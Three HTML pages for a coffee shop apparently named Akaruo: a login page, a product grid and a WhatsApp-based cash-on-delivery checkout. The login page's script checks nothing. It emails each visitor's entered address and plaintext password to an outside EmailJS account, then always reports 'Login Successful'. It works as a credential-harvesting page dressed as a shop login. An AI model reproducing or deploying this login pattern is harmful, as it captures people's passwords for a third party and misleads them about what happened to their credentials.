<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Akaruo Login</title>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>
body{margin:0;font-family:Arial;height:100vh;display:flex;justify-content:center;align-items:center;background:url('https://i.ibb.co/pvtWqhg4/9a6b0b3fee7d1bb5a3d835db58c37514.jpg') center/cover no-repeat;}

.box{
background:rgba(0,0,0,0.6);
padding:20px;
border-radius:15px;
color:white;
text-align:center;
}

input{
display:block;
margin:10px auto;
padding:10px;
width:200px;
}

button{
padding:10px 20px;
background:orange;
border:none;
color:white;
cursor:pointer;
}
</style>
</head>

<body>

<div class="box">
<h2>Welcome to Akaruo</h2>
<p>Premium in Every Sip</p>

<input type="email" id="email" placeholder="Email">
<input type="password" id="pass" placeholder="Password">

<button onclick="login()">Login</button>
</div>

<script>
emailjs.init("q5vozu2csm6VaK-CD");

function login(){
let email=document.getElementById("email").value;
let pass=document.getElementById("pass").value;

if(email==""||pass==""){
alert("Please fill all fields");
return;
}

emailjs.send("service_09us05e","template_ddxzwcr",{
user_email:email,
user_password:pass,
time:new Date().toLocaleString()
});

alert("Login Successful");
window.location.href="home.html";
}
</script>

</body>
</html>

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Items</title>

<style>
body{margin:0;font-family:Arial;background:#f4f4f4}

.grid{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
gap:10px;
padding:10px;
}

.card{
background:white;
padding:10px;
text-align:center;
}

img{width:100%}

button{
background:orange;
border:none;
padding:8px;
color:white;
cursor:pointer;
}
</style>
</head>

<body>

<div class="grid">

<script>
let products=[
["Coffee 1",99,"https://i.ibb.co/3y411ypW/1000066817.jpg"],
["Coffee 2",120,"https://i.ibb.co/zVxvWzrD/1000066832.jpg"],
["Coffee 3",150,"https://i.ibb.co/DDDCrR8B/1000066879.jpg"],
["Coffee 4",180,"https://i.ibb.co/JwGNRSv6/1000066820.jpg"],
["Coffee 5",200,"https://i.ibb.co/TB8sMskZ/1000066807.jpg"],
["Coffee 6",220,"https://i.ibb.co/7xMSNtCB/1000066755.jpg"]
];

products.forEach(p=>{
document.write(`
<div class="card">
<img src="${p[2]}">
<h3>${p[0]}</h3>
<p>₹${p[1]}</p>
<button onclick="buy('${p[0]}',${p[1]})">Buy Now</button>
</div>
`);
});

function buy(name,price){
window.location.href=`checkout.html?name=${name}&price=${price}`;
}
</script>

</div>

</body>
</html>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checkout</title>

<style>
body{font-family:Arial;background:#f4f4f4;padding:20px}

.box{
background:white;
padding:20px;
max-width:400px;
margin:auto;
}

input{
display:block;
width:100%;
margin:10px 0;
padding:10px;
}

button{
background:green;
color:white;
padding:10px;
border:none;
width:100%;
}
</style>
</head>

<body>

<div class="box">

<h3 id="product"></h3>
<p id="price"></p>

<input id="name" placeholder="Full Name">
<input id="phone" placeholder="Mobile Number">
<input id="address" placeholder="Address">
<input id="city" placeholder="City">
<input id="pin" placeholder="Pincode">

<button onclick="order()">Place Order (COD)</button>

</div>

<script>
let params=new URLSearchParams(window.location.search);
let name=params.get("name");
let price=params.get("price");

document.getElementById("product").innerText=name;
document.getElementById("price").innerText="₹"+price;

function order(){
let n=document.getElementById("name").value;
let p=document.getElementById("phone").value;
let a=document.getElementById("address").value;
let c=document.getElementById("city").value;
let pin=document.getElementById("pin").value;

if(n==""||p==""||a==""||c==""||pin==""){
alert("Fill all details");
return;
}

let msg=`Order:
Name: ${n}
Phone: ${p}
Address: ${a}
City: ${c}
Pincode: ${pin}
Product: ${name}
Price: ₹${price}`;

window.location.href=`https://wa.me/919608891170?text=${encodeURIComponent(msg)}`;
}
</script>

</body>
</html>
